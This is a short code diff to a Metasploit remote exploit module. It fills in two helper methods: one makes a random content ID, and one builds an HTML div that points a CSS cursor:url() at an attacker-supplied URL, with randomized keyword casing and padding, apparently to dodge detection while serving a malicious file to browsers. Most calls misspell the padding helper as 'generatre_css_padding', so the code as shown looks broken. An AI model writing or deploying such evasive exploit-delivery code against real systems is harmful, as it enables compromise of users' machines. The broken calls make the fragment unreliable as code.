@@ -173,11 +173,25 @@ class MetasploitModule < Msf::Exploit::Remote
   end
 
   def generate_cid
-
+    rand_text_alphanumeric(32)+'@'+rand_text_alphanumeric(8)
   end
 
   def generate_div(url)
-
+    "<div style='" +
+      generate_css_padding() +
+      Rex::Text.to_rand_case("cursor") +
+      generatre_css_padding() +
+      ":" +
+      generatre_css_padding() +
+      Rex::Text.to_rand_case("url(") +
+      generatre_css_padding() +
+      "\"#{url}\"" +
+      generatre_css_padding() +
+      ");" +
+      generatre_css_padding() +
+      "'>" +
+      generatre_css_padding() +
+    "</div>"
   end
 
   #
